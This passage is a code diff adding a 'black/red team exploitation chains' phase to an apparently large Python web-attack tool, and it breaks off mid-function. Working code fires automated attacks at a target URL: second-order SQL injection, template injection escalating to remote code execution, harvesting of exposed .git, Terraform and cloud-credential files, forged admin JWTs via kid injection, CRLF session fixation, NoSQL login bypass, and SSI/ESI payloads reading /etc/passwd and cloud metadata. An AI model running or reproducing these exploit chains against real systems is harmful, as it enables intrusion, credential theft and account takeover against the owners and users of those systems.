@@ -14753,6 +14753,1759 @@ class DynamicWAFBypassAdapter:
 
 
 # ══════════════════════════════════════════════════════════════
+# PHASE 17 — ADVANCED BLACK/RED TEAM EXPLOITATION CHAINS
+# Tools t366–t385 | 20 skills
+# ══════════════════════════════════════════════════════════════
+
+# ── t366: Second-Order SQL Injection Chain ──────────────────
+class SecondOrderSQLiChain:
+    """Store a SQLi payload in a writable field (register/profile),
+    then trigger retrieval via a search/display endpoint that processes
+    stored data without re-parameterizing the query."""
+    NAME = "Second-Order SQLi Chain"
+    REGISTER_PATHS = ["/api/register", "/api/signup", "/api/users",
+                      "/register", "/signup", "/api/account/create"]
+    STORE_BODIES = [
+        {"username": "apex'--",          "email": "apex1@x.com", "password": "Apex@1234!"},
+        {"name":     "test'--",          "email": "apex2@x.com", "password": "Apex@1234!"},
+        {"first_name":"a'OR'1'='1'--",   "last_name": "b",
+         "email": "apex3@x.com",         "password": "Apex@1234!"},
+        {"display_name": "x'/**/OR/**/1=1--", "email": "apex4@x.com", "password": "Apex@1234!"},
+    ]
+    TRIGGER_PATHS = ["/api/users/search?q=apex", "/api/search?query=apex",
+                     "/search?q=apex", "/api/profile", "/api/users/me",
+                     "/api/account", "/dashboard", "/admin/users"]
+    SQLI_ERRORS = ["you have an error in your sql", "syntax error near",
+                   "unclosed quotation mark", "ora-00907", "pg_query()",
+                   "mysql_fetch", "sqlite_", "invalid column name",
+                   "unterminated string", "sql syntax", "odbc driver",
+                   "jdbc", "pdo exception", "database error"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("2ND-ORDER-SQLI-366: Store→trigger SQL injection chain across endpoints")
+        base = profile.url.rstrip("/")
+        hits = []
+        for reg in self.REGISTER_PATHS:
+            for tmpl in self.STORE_BODIES:
+                body_bytes = json.dumps(tmpl).encode()
+                r = _fetch(f"{base}{reg}", cfg.ua, cfg.timeout, method="POST",
+                           data=body_bytes,
+                           extra_headers={"Content-Type": "application/json"})
+                if r.status not in (200, 201, 204):
+                    continue
+                ok(f"  Payload stored via {reg}")
+                for trig in self.TRIGGER_PATHS:
+                    r2 = _fetch(f"{base}{trig}", cfg.ua, cfg.timeout)
+                    body_lo = (r2.body or b"").decode("utf-8", errors="replace").lower()
+                    for err in self.SQLI_ERRORS:
+                        if err in body_lo:
+                            payload = next((v for v in tmpl.values() if "'" in str(v)), str(tmpl))
+                            hits.append({"store": reg, "trigger": trig,
+                                         "payload": payload, "error": err})
+                            break
+        if hits:
+            h = hits[0]
+            profile.findings.append(Finding(
+                id="P17-2NDORDER-SQLI-001",
+                title=f"Second-Order SQLi: store via {h['store']}, trigger via {h['trigger']}",
+                severity="CRITICAL", cvss=9.1, cwe="CWE-89",
+                description=(
+                    f"A SQL injection payload stored in {h['store']} is later executed "
+                    f"unsanitized by a query at {h['trigger']}. "
+                    f"Allows full database read/write bypassing input validation at the write layer."
+                ),
+                evidence="\n".join(f"store={x['store']} trigger={x['trigger']} err={x['error']}"
+                                   for x in hits[:3]),
+                reproduction=(
+                    f"1. POST {base}{h['store']} with {{'username':'apex'--',...}}\n"
+                    f"2. GET {base}{h['trigger']} — observe SQL error"
+                ),
+                poc_curl=(
+                    f"curl -sk -X POST '{base}{h['store']}' "
+                    f"-H 'Content-Type: application/json' "
+                    f"-d '{{\"username\":\"apex'--\",\"email\":\"x@x.com\",\"password\":\"P@ss1\"}}'\n"
+                    f"curl -sk '{base}{h['trigger']}'"
+                ),
+                category="SQL Injection",
+                remediation=(
+                    "Use parameterized queries at every DB access point, including secondary reads "
+                    "of stored data. Never treat stored input as trusted."
+                )
+            ))
+        else:
+            info("  No second-order SQLi confirmed")
+        return profile
+
+
+# ── t367: SSTI Auto-Exploit Chain ────────────────────────────
+class SSTIAutoExploitChain:
+    """Identify template engine from SSTI error signatures, then auto-select
+    and deliver the correct RCE payload for Jinja2, Twig, Freemarker, Pebble,
+    Velocity, Mako, or Smarty."""
+    NAME = "SSTI Auto-Exploit Chain"
+    ENGINE_PROBES = [
+        ("{{7*'7'}}", "7777777",   "Jinja2/Twig"),
+        ("#{7*7}",    "49",        "Groovy/Spring-EL"),
+        ("${7*7}",    "49",        "Freemarker/Velocity/Pebble"),
+        ("<%= 7*7 %>","49",        "ERB/JSP"),
+        ("[#assign x=7*7]${x}", "49", "Freemarker"),
+        ("*{7*7}",    "49",        "Spring-EL Thymeleaf"),
+    ]
+    RCE_PAYLOADS = {
+        "Jinja2/Twig": [
+            "{{''.__class__.__mro__[1].__subclasses__()[365](['id'],stdout=-1).communicate()[0].decode()}}",
+            "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'Popen' in x.__name__%}{{x(['id'],stdout=-1).communicate()[0]}}{%endif%}{%endfor%}",
+        ],
+        "Freemarker/Velocity/Pebble": [
+            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        ],
+        "Groovy/Spring-EL": [
+            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+            "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}",
+        ],
+        "Spring-EL Thymeleaf": [
+            "*{T(java.lang.Runtime).getRuntime().exec('id')}",
+        ],
+    }
+    RCE_CONFIRM = re.compile(r"uid=\d+\([a-z]+\)|root|www-data|daemon|nobody")
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("SSTI-AUTO-EXPLOIT-367: Template engine fingerprint → targeted RCE chain")
+        base = profile.url.rstrip("/")
+        params = list(dict.fromkeys(profile.parameters[:12]))
+        if not params:
+            params = ["q", "search", "name", "template", "msg", "text"]
+        found_engine = None
+        found_param = None
+        for param in params:
+            for probe, expected, engine in self.ENGINE_PROBES:
+                r = _fetch(f"{base}?{param}={urllib.parse.quote(probe)}", cfg.ua, cfg.timeout)
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                if expected in body:
+                    found_engine = engine
+                    found_param = param
+                    ok(f"  SSTI confirmed — engine={engine} param={param}")
+                    break
+            if found_engine:
+                break
+        if not found_engine:
+            info("  No SSTI engine fingerprinted")
+            return profile
+        # Now attempt RCE with engine-specific payloads
+        rce_payloads = self.RCE_PAYLOADS.get(found_engine, [])
+        for payload in rce_payloads:
+            r = _fetch(f"{base}?{found_param}={urllib.parse.quote(payload)}",
+                       cfg.ua, cfg.timeout)
+            body = (r.body or b"").decode("utf-8", errors="replace")
+            if self.RCE_CONFIRM.search(body):
+                high(f"  SSTI→RCE CONFIRMED: engine={found_engine}")
+                profile.chain_state["ssti_rce_param"] = found_param
+                profile.chain_state["ssti_engine"] = found_engine
+                profile.findings.append(Finding(
+                    id="P17-SSTI-RCE-001",
+                    title=f"SSTI → RCE Confirmed — {found_engine} on param '{found_param}'",
+                    severity="CRITICAL", cvss=10.0, cwe="CWE-1336",
+                    description=(
+                        f"Server-side template injection in parameter '{found_param}' executes "
+                        f"arbitrary OS commands via {found_engine} template evaluation. "
+                        f"Full unauthenticated RCE achieved."
+                    ),
+                    evidence=f"engine={found_engine} | param={found_param} | rce_output={body[:120]}",
+                    reproduction=(
+                        f"GET {base}?{found_param}=<ssti-rce-payload>\n"
+                        f"Engine fingerprint: {found_engine}"
+                    ),
+                    poc_curl=(
+                        f"curl -sk '{base}?{found_param}={urllib.parse.quote(payload)}'"
+                    ),
+                    category="SSTI / RCE",
+                    remediation=(
+                        f"Never pass user-controlled input to {found_engine} template rendering. "
+                        "Use sandboxed environments, disable dangerous builtins, "
+                        "or use logic-less templates (Mustache/Handlebars)."
+                    )
+                ))
+                break
+        return profile
+
+
+# ── t368: Exposed .git Repo Reconstructor ────────────────────
+class GitRepoReconstructor:
+    """Detect an exposed /.git/ directory and reconstruct key source files
+    by downloading HEAD, FETCH_HEAD, packed-refs, COMMIT_EDITMSG, and
+    loose object files to surface committed secrets and source code."""
+    NAME = "Git Repo Reconstructor"
+    GIT_PATHS = [
+        "/.git/HEAD",
+        "/.git/config",
+        "/.git/COMMIT_EDITMSG",
+        "/.git/FETCH_HEAD",
+        "/.git/packed-refs",
+        "/.git/logs/HEAD",
+        "/.git/refs/heads/main",
+        "/.git/refs/heads/master",
+    ]
+    SECRET_PATTERNS = [
+        re.compile(r"password\s*=\s*\S+", re.I),
+        re.compile(r"secret[_\s]*=\s*\S+", re.I),
+        re.compile(r"api[_\s]*key\s*=\s*\S+", re.I),
+        re.compile(r"(AKIA|ASIA)[A-Z0-9]{16}"),
+        re.compile(r"sk-[a-zA-Z0-9]{48}"),
+        re.compile(r"token\s*=\s*\S+", re.I),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("GIT-RECON-368: Detect exposed .git directory and reconstruct secrets/source")
+        base = profile.url.rstrip("/")
+        head_r = _fetch(f"{base}/.git/HEAD", cfg.ua, cfg.timeout)
+        head_body = (head_r.body or b"").decode("utf-8", errors="replace")
+        if head_r.status != 200 or "ref:" not in head_body:
+            info("  /.git/HEAD not accessible")
+            return profile
+        high(f"  EXPOSED .git directory: {base}/.git/")
+        harvested = {"/.git/HEAD": head_body.strip()}
+        secrets_found = []
+        for path in self.GIT_PATHS[1:]:
+            r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout)
+            if r.status == 200 and r.body:
+                content = (r.body or b"").decode("utf-8", errors="replace")
+                harvested[path] = content[:500]
+                for pat in self.SECRET_PATTERNS:
+                    for m in pat.findall(content):
+                        secrets_found.append(f"{path}: {str(m)[:80]}")
+        evidence_lines = [f"{p}: {v[:80]}" for p, v in list(harvested.items())[:6]]
+        if secrets_found:
+            evidence_lines += ["--- SECRETS ---"] + secrets_found[:5]
+        profile.findings.append(Finding(
+            id="P17-GIT-EXPOSED-001",
+            title="Exposed .git Repository — Source Code and Secret Leak",
+            severity="CRITICAL", cvss=9.8, cwe="CWE-538",
+            description=(
+                f"The /.git/ directory is publicly accessible at {base}/.git/. "
+                f"Attacker can reconstruct full source code, extract committed credentials, "
+                f"API keys, and deploy keys. "
+                + (f"{len(secrets_found)} potential secrets extracted." if secrets_found else "")
+            ),
+            evidence="\n".join(evidence_lines),
+            reproduction=(
+                f"git clone --bare {base}/.git/ recovered_repo\n"
+                f"cd recovered_repo && git log --oneline | head -20"
+            ),
+            poc_curl=(
+                f"curl -sk '{base}/.git/HEAD'\n"
+                f"curl -sk '{base}/.git/config'\n"
+                f"curl -sk '{base}/.git/COMMIT_EDITMSG'\n"
+                f"# Full dump: git-dumper {base}/.git/ ./dumped_repo"
+            ),
+            category="Information Disclosure",
+            remediation=(
+                "Block access to /.git/ via web server config: "
+                "nginx: `location ~ /\\.git { deny all; }` "
+                "Apache: `RedirectMatch 404 /\\.git`. "
+                "Rotate any secrets found in git history."
+            )
+        ))
+        return profile
+
+
+# ── t369: Terraform / IaC State File Harvester ───────────────
+class TerraformStateHarvester:
+    """Probe for publicly accessible Terraform state files, environment
+    variable files, and Helm secret files that expose cloud credentials."""
+    NAME = "Terraform State Harvester"
+    PATHS = [
+        "/terraform.tfstate", "/terraform.tfstate.backup",
+        "/terraform.tfvars",  "/.terraform/terraform.tfstate",
+        "/infra/terraform.tfstate", "/deploy/terraform.tfstate",
+        "/.env.production", "/.env.prod", "/.env.staging",
+        "/.env.local", "/.env.backup",
+        "/helm/values.yaml", "/k8s/secrets.yaml",
+        "/deploy/secrets.yaml", "/config/secrets.yaml",
+        "/.aws/credentials", "/.azure/credentials",
+        "/gcloud/application_default_credentials.json",
+    ]
+    SECRETS_RE = [
+        re.compile(r'"access_key"\s*:\s*"(AKIA[A-Z0-9]{16})"'),
+        re.compile(r'"secret_key"\s*:\s*"([^"]{20,})"'),
+        re.compile(r'password\s*=\s*"([^"]{6,})"', re.I),
+        re.compile(r'(AKIA|ASIA)[A-Z0-9]{16}'),
+        re.compile(r'"client_secret"\s*:\s*"([^"]{10,})"'),
+        re.compile(r'subscription_id\s*=\s*"([^"]+)"', re.I),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("TFSTATE-HARVEST-369: Terraform/IaC state file and secrets exposure")
+        base = profile.url.rstrip("/")
+        hits = []
+        for path in self.PATHS:
+            r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout)
+            if r.status != 200 or not r.body:
+                continue
+            content = (r.body or b"").decode("utf-8", errors="replace")
+            if len(content) < 20:
+                continue
+            extracted = []
+            for pat in self.SECRETS_RE:
+                for m in pat.findall(content):
+                    val = m if isinstance(m, str) else m[0] if m else ""
+                    if val:
+                        extracted.append(val[:60])
+            hits.append({"path": path, "size": len(content),
+                          "secrets": extracted, "preview": content[:200]})
+            high(f"  IaC state exposed: {path} ({len(content)} bytes, "
+                 f"{len(extracted)} secret patterns)")
+        if hits:
+            all_secrets = [s for h in hits for s in h["secrets"]]
+            profile.findings.append(Finding(
+                id="P17-TFSTATE-001",
+                title=f"Terraform/IaC State File Exposed — {len(hits)} file(s) accessible",
+                severity="CRITICAL", cvss=9.9, cwe="CWE-312",
+                description=(
+                    f"{len(hits)} infrastructure-as-code file(s) are publicly readable. "
+                    f"Terraform state files contain plaintext cloud credentials, resource ARNs, "
+                    f"database passwords, and API keys. "
+                    + (f"{len(all_secrets)} credential patterns extracted." if all_secrets else "")
+                ),
+                evidence="\n".join(
+                    f"{h['path']} ({h['size']}B): {'; '.join(h['secrets'][:3]) or h['preview'][:80]}"
+                    for h in hits[:5]
+                ),
+                reproduction="\n".join(f"curl -sk '{base}{h['path']}'" for h in hits[:3]),
+                poc_curl="\n".join(f"curl -sk '{base}{h['path']}' | python3 -m json.tool"
+                                   for h in hits[:3]),
+                category="Information Disclosure",
+                remediation=(
+                    "Never store state files on public web servers. "
+                    "Use remote state backends (S3+encryption, Terraform Cloud). "
+                    "Block access via web server rules. Rotate all exposed credentials immediately."
+                )
+            ))
+        else:
+            info("  No exposed IaC state files found")
+        return profile
+
+
+# ── t370: JWT kid SQL/Path-Traversal Injection Chain ─────────
+class JWTKidInjectionChain:
+    """Forge JWTs with SQL injection or path traversal in the `kid`
+    (key ID) header field to load an attacker-controlled signing key,
+    bypassing JWT signature verification."""
+    NAME = "JWT kid Injection Chain"
+    KID_SQLI_PAYLOADS = [
+        "' UNION SELECT 'attacker_key'--",
+        "' UNION SELECT 'attacker_key' FROM dual--",
+        "../../dev/null",
+        "/dev/null",
+        "../../../../../../dev/null",
+        "' OR '1'='1",
+    ]
+    ATTACKER_KEY = "attacker_key"
+
+    def _forge_jwt_kid(self, orig_jwt: str, kid_payload: str, secret: str) -> str:
+        try:
+            parts = orig_jwt.split(".")
+            if len(parts) != 3:
+                return ""
+            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
+            header["kid"] = kid_payload
+            header["alg"] = "HS256"
+            for k in ["role", "roles", "type", "userType"]:
+                if k in payload:
+                    payload[k] = "admin"
+            for k in ["isAdmin", "admin"]:
+                if k in payload:
+                    payload[k] = True
+            new_h = base64.urlsafe_b64encode(
+                json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
+            new_p = base64.urlsafe_b64encode(
+                json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
+            sig_input = f"{new_h}.{new_p}".encode()
+            sig = hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
+            return f"{new_h}.{new_p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
+        except Exception:
+            return ""
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("JWT-KID-INJECT-370: kid SQL/path-traversal injection to forge admin tokens")
+        jwt = profile.chain_state.get("auth_jwt", "")
+        if not jwt:
+            # Try to find JWT from existing findings
+            for f in profile.findings:
+                if "JWT" in f.category and "eyJ" in f.evidence:
+                    m = re.search(r"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)",
+                                  f.evidence)
+                    if m:
+                        jwt = m.group(1)
+                        break
+        if not jwt:
+            info("  No JWT available for kid injection test")
+            return profile
+        base = profile.url.rstrip("/")
+        test_paths = ["/api/admin", "/api/users", "/api/profile", "/api/dashboard",
+                      "/admin", "/api/v1/admin", "/api/settings"]
+        for kid_payload in self.KID_SQLI_PAYLOADS:
+            forged = self._forge_jwt_kid(jwt, kid_payload, self.ATTACKER_KEY)
+            if not forged:
+                continue
+            for path in test_paths[:4]:
+                r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout,
+                           extra_headers={"Authorization": f"Bearer {forged}"})
+                if r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(k in body for k in ['"email"', '"users"', '"admin"',
+                                               '"role"', '"secret"', '"config"']):
+                        high(f"  JWT kid injection CONFIRMED: kid={kid_payload[:40]}")
+                        inject_type = ("SQL injection"
+                                       if "SELECT" in kid_payload or "'" in kid_payload
+                                       else "path traversal")
+                        profile.findings.append(Finding(
+                            id="P17-JWT-KID-001",
+                            title=f"JWT kid Injection — Forged Admin Token via kid={kid_payload[:40]}",
+                            severity="CRITICAL", cvss=9.8, cwe="CWE-347",
+                            description=(
+                                f"The JWT `kid` (key ID) header parameter is vulnerable to "
+                                f"{inject_type}. "
+                                f"By injecting '{kid_payload}' as kid and signing with '{self.ATTACKER_KEY}', "
+                                f"the server uses an attacker-controlled key to verify the JWT, "
+                                f"granting admin access."
+                            ),
+                            evidence=f"kid={kid_payload} | path={path} | status=200 | body={body[:100]}",
+                            reproduction=(
+                                f"1. Forge JWT with kid='{kid_payload}' signed with '{self.ATTACKER_KEY}'\n"
+                                f"2. Send to {base}{path} with Authorization: Bearer <forged>"
+                            ),
+                            poc_curl=(
+                                f"# Forge JWT with kid injection (python3 -c):\n"
+                                f"python3 -c \"import jwt; print(jwt.encode({{'role':'admin'}}, "
+                                f"'{self.ATTACKER_KEY}', algorithm='HS256', "
+                                f"headers={{'kid':'{kid_payload}'}}))\"\n"
+                                f"curl -sk '{base}{path}' -H 'Authorization: Bearer <forged_token>'"
+                            ),
+                            category="JWT / Authentication",
+                            remediation=(
+                                "Never use the `kid` field to load signing keys from the database or "
+                                "filesystem based on user input. Use a static key registry keyed by a "
+                                "safe, validated identifier. Whitelist allowed kid values."
+                            )
+                        ))
+                        return profile
+        info("  No JWT kid injection confirmed")
+        return profile
+
+
+# ── t371: Dependency Confusion V2 Detector ───────────────────
+class DependencyConfusionV2:
+    """Extract package names from JavaScript/Python manifests exposed on the
+    target, then check whether those names also exist in public registries —
+    a mismatch could allow dependency confusion supply-chain attacks."""
+    NAME = "Dependency Confusion V2"
+    MANIFEST_PATHS = [
+        "/package.json", "/package-lock.json", "/requirements.txt",
+        "/Pipfile", "/Pipfile.lock", "/setup.py",
+        "/composer.json", "/Gemfile", "/pom.xml",
+        "/build.gradle", "/yarn.lock",
+    ]
+    NPM_CHECK    = "https://registry.npmjs.org/{name}"
+    PYPI_CHECK   = "https://pypi.org/pypi/{name}/json"
+
+    def _extract_npm_names(self, content: str) -> List[str]:
+        try:
+            data = json.loads(content)
+            deps: Dict = {}
+            for key in ("dependencies", "devDependencies", "peerDependencies"):
+                deps.update(data.get(key, {}))
+            return [n for n in list(deps.keys())[:20] if n.startswith("@") or "-" in n or "_" in n]
+        except Exception:
+            return []
+
+    def _extract_pypi_names(self, content: str) -> List[str]:
+        names = []
+        for line in content.splitlines():
+            line = re.sub(r"[>=<!\[#].*", "", line).strip()
+            if line and not line.startswith("-"):
+                names.append(line[:60])
+        return names[:20]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("DEP-CONFUSION-V2-371: Manifest harvest + public registry confusion check")
+        base = profile.url.rstrip("/")
+        confusion_hits = []
+        for path in self.MANIFEST_PATHS:
+            r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout)
+            if r.status != 200 or not r.body:
+                continue
+            content = (r.body or b"").decode("utf-8", errors="replace")
+            ok(f"  Manifest found: {path} ({len(content)} bytes)")
+            if "package.json" in path or "yarn.lock" in path:
+                names = self._extract_npm_names(content)
+                for name in names[:10]:
+                    check_url = self.NPM_CHECK.format(name=urllib.parse.quote(name, safe="@/"))
+                    rc = _fetch(check_url, "APEX/1.0", 8)
+                    if rc.status == 404:
+                        warn(f"  CONFUSION CANDIDATE (npm): {name} — not in public registry!")
+                        confusion_hits.append({"pkg": name, "registry": "npm", "manifest": path})
+            elif "requirements.txt" in path or "Pipfile" in path or "setup.py" in path:
+                names = self._extract_pypi_names(content)
+                for name in names[:10]:
+                    check_url = self.PYPI_CHECK.format(name=urllib.parse.quote(name))
+                    rc = _fetch(check_url, "APEX/1.0", 8)
+                    if rc.status == 404:
+                        warn(f"  CONFUSION CANDIDATE (pypi): {name} — not in public registry!")
+                        confusion_hits.append({"pkg": name, "registry": "pypi", "manifest": path})
+        if confusion_hits:
+            profile.findings.append(Finding(
+                id="P17-DEP-CONFUSION-001",
+                title=f"Dependency Confusion: {len(confusion_hits)} private pkg(s) not on public registry",
+                severity="HIGH", cvss=8.8, cwe="CWE-427",
+                description=(
+                    f"{len(confusion_hits)} package name(s) referenced in manifests are absent from "
+                    f"the public registry. Publishing a malicious package under the same name on "
+                    f"npm/PyPI could poison the build pipeline of this application."
+                ),
+                evidence="\n".join(
+                    f"{h['registry']}:{h['pkg']} (manifest: {h['manifest']})"
+                    for h in confusion_hits[:8]
+                ),
+                reproduction=(
+                    "1. Register the package name on the public registry.\n"
+                    "2. Publish a version higher than any internal version.\n"
+                    "3. Wait for CI/CD build to install the malicious version."
+                ),
+                poc_curl="\n".join(
+                    f"# {h['registry']} confusion: publish '{h['pkg']}' to public registry"
+                    for h in confusion_hits[:3]
+                ),
+                category="Supply Chain",
+                remediation=(
+                    "Use package namespacing (@org/package). Pin exact versions with lock files. "
+                    "Configure npm/pip to only resolve from private registry. "
+                    "Use Subresource Integrity (SRI) for CDN assets."
+                )
+            ))
+        else:
+            info("  No dependency confusion candidates found")
+        return profile
+
+
+# ── t372: CRLF Injection → Session Fixation Chain ────────────
+class CRLFSessionFixationChain:
+    """Inject CRLF sequences to add arbitrary headers to HTTP responses,
+    then escalate to session fixation by injecting a Set-Cookie header
+    with a known session identifier."""
+    NAME = "CRLF Session Fixation Chain"
+    CRLF_PAYLOADS = [
+        "%0d%0aSet-Cookie:%20apex_session=APEX_FIXED_SID;%20Path=/",
+        "%0aSet-Cookie:%20apex_session=APEX_FIXED_SID;%20Path=/",
+        "%0d%0aLocation:%20https://attacker.com",
+        "%E5%98%8D%E5%98%8ASet-Cookie:%20apex_session=APEX_FIXED_SID",
+        "%0d%0aX-APEX-INJECTED:%20crlf_confirmed",
+    ]
+    TEST_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "goto",
+                   "callback", "location", "dest", "target", "path"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CRLF-SESSFIX-372: CRLF header injection → Set-Cookie session fixation chain")
+        base = profile.url.rstrip("/")
+        test_urls = [base] + [f"{base}{p}" for p in
+                               ["/login", "/auth/login", "/redirect", "/oauth/authorize"]]
+        for url in test_urls:
+            for param in self.TEST_PARAMS:
+                for payload in self.CRLF_PAYLOADS:
+                    test_url = f"{url}?{param}={payload}"
+                    r = _fetch(test_url, cfg.ua, cfg.timeout)
+                    if r.status == 0:
+                        continue
+                    raw_hdrs = str(r.headers)
+                    injected = False
+                    if "apex_session" in raw_hdrs.lower() or "apex-injected" in raw_hdrs.lower():
+                        injected = True
+                    elif r.status in (301, 302, 303, 307, 308):
+                        loc = r.headers.get("location", "")
+                        if "apex_session" in loc or "attacker.com" in loc:
+                            injected = True
+                    if injected:
+                        high(f"  CRLF injection confirmed: param={param} url={url}")
+                        profile.findings.append(Finding(
+                            id="P17-CRLF-SESSFIX-001",
+                            title=f"CRLF Injection → Session Fixation via parameter '{param}'",
+                            severity="HIGH", cvss=7.5, cwe="CWE-113",
+                            description=(
+                                f"The '{param}' parameter accepts CRLF sequences that are reflected "
+                                f"into HTTP response headers. An attacker can inject Set-Cookie to "
+                                f"fix a victim's session ID before authentication, then take over "
+                                f"the session after the victim logs in."
+                            ),
+                            evidence=f"param={param} | payload={payload[:80]} | injected_header_detected",
+                            reproduction=(
+                                f"GET {url}?{param}={payload}\n"
+                                f"Observe Set-Cookie header in response."
+                            ),
+                            poc_curl=(
+                                f"curl -sk -D - '{url}?{param}={payload}' | grep -i 'set-cookie\\|location'"
+                            ),
+                            category="CRLF Injection",
+                            remediation=(
+                                "Strip or reject %0d, %0a, and their double-encoded equivalents "
+                                "from all redirect/URL parameters. Use framework-provided redirect "
+                                "functions that sanitize headers."
+                            )
+                        ))
+                        return profile
+        info("  No CRLF session fixation confirmed")
+        return profile
+
+
+# ── t373: Blind NoSQL Injection (MongoDB Regex Boolean Blind) ─
+class BlindNoSQLiChain:
+    """Test for boolean-based blind NoSQL injection using MongoDB $regex
+    operator in JSON bodies and URL parameters to confirm injection
+    and extract data character by character."""
+    NAME = "Blind NoSQL Injection Chain"
+    NOSQL_PAYLOADS = [
+        # JSON body injection via $regex
+        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
+        {"email": {"$regex": ".*"},    "password": {"$gt": ""}},
+        {"username": {"$ne": ""},      "password": {"$ne": ""}},
+        {"$where": "sleep(100)"},
+    ]
+    URL_PAYLOADS = [
+        "[$regex]=.*&password[$regex]=.*",
+        "[$ne]=nonexistent",
+        "[$gt]=",
+        "[$exists]=true",
+    ]
+    LOGIN_PATHS = ["/api/login", "/api/auth", "/login", "/api/signin",
+                   "/auth/login", "/api/users/login"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("BLIND-NOSQLI-373: MongoDB boolean-blind injection via regex/operator payloads")
+        base = profile.url.rstrip("/")
+        for path in self.LOGIN_PATHS:
+            # Test baseline with invalid creds
+            baseline_body = json.dumps({"username": "invalid_apex_user_xyz",
+                                        "password": "invalid_pass_xyz"}).encode()
+            r_base = _fetch(f"{base}{path}", cfg.ua, cfg.timeout, method="POST",
+                            data=baseline_body,
+                            extra_headers={"Content-Type": "application/json"})
+            if r_base.status == 0:
+                continue
+            base_len = len(r_base.body or b"")
+            # Test with NoSQL injection payloads
+            for payload in self.NOSQL_PAYLOADS:
+                inj_body = json.dumps(payload).encode()
+                r_inj = _fetch(f"{base}{path}", cfg.ua, cfg.timeout, method="POST",
+                               data=inj_body,
+                               extra_headers={"Content-Type": "application/json"})
+                if r_inj.status == 0:
+                    continue
+                inj_body_text = (r_inj.body or b"").decode("utf-8", errors="replace")
+                # Success indicators
+                auth_success = any(k in inj_body_text.lower() for k in
+                                   ["token", "access_token", "jwt", "session",
+                                    "dashboard", "welcome", "success"])
+                len_diff = abs(len(r_inj.body or b"") - base_len)
+                if (r_inj.status == 200 and auth_success) or \
+                   (r_inj.status != r_base.status and r_inj.status == 200) or \
+                   (len_diff > 100 and r_inj.status == 200):
+                    high(f"  NoSQLi CONFIRMED at {path}")
+                    profile.findings.append(Finding(
+                        id="P17-NOSQLI-REGEX-001",
+                        title=f"Blind NoSQL Injection (MongoDB) — authentication bypass at {path}",
+                        severity="CRITICAL", cvss=9.8, cwe="CWE-943",
+                        description=(
+                            f"The login endpoint {path} is vulnerable to NoSQL injection. "
+                            f"MongoDB operator injection ({list(payload.keys())[0]}) bypasses "
+                            f"authentication, returning a valid session for any account. "
+                            f"Full authentication bypass confirmed."
+                        ),
+                        evidence=(
+                            f"path={path} | baseline_status={r_base.status} | "
+                            f"injected_status={r_inj.status} | response_diff={len_diff}B"
+                        ),
+                        reproduction=(
+                            f"POST {base}{path}\n"
+                            f"Content-Type: application/json\n"
+                            f"Body: {json.dumps(payload)}"
+                        ),
+                        poc_curl=(
+                            f"curl -sk -X POST '{base}{path}' "
+                            f"-H 'Content-Type: application/json' "
+                            f"-d '{json.dumps(payload)}'"
+                        ),
+                        category="NoSQL Injection",
+                        remediation=(
+                            "Sanitize all user input before use in MongoDB queries. "
+                            "Reject objects/arrays where strings are expected. "
+                            "Use mongoose schema type enforcement or express-mongo-sanitize middleware."
+                        )
+                    ))
+                    return profile
+        info("  No NoSQL injection confirmed")
+        return profile
+
+
+# ── t374: SSI / ESI Injection Prober ────────────────────────
+class SSIESIInjectionProber:
+    """Probe for Server-Side Includes (SSI) and Edge Side Includes (ESI)
+    injection in parameters, form fields and file names to achieve
+    file read and OS command execution."""
+    NAME = "SSI / ESI Injection Prober"
+    SSI_PAYLOADS = [
+        "<!--#exec cmd=\"id\"-->",
+        "<!--#exec cmd=\"cat /etc/passwd\"-->",
+        "<!--#include virtual=\"/etc/passwd\"-->",
+        "<!--#printenv-->",
+        "<!--#echo var=\"DATE_LOCAL\"-->",
+    ]
+    ESI_PAYLOADS = [
+        '<esi:include src="http://169.254.169.254/latest/meta-data/"/>',
+        '<esi:include src="/etc/passwd"/>',
+        '<esi:vars>$(HTTP_HOST)</esi:vars>',
+    ]
+    SSI_CONFIRM  = re.compile(r"uid=\d+|root:|/bin/bash|SERVER_SOFTWARE|DATE_LOCAL")
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("SSI-ESI-INJECT-374: Server/Edge-Side Includes injection for file-read and RCE")
+        base = profile.url.rstrip("/")
+        params = list(dict.fromkeys(profile.parameters[:10])) or ["name", "q", "search", "page"]
+        all_payloads = [(p, "SSI") for p in self.SSI_PAYLOADS] + \
+                       [(p, "ESI") for p in self.ESI_PAYLOADS]
+        for param in params:
+            for payload, ptype in all_payloads:
+                r = _fetch(f"{base}?{param}={urllib.parse.quote(payload)}",
+                           cfg.ua, cfg.timeout)
+                body = (r.body or b"").decode("utf-8", errors="replace")
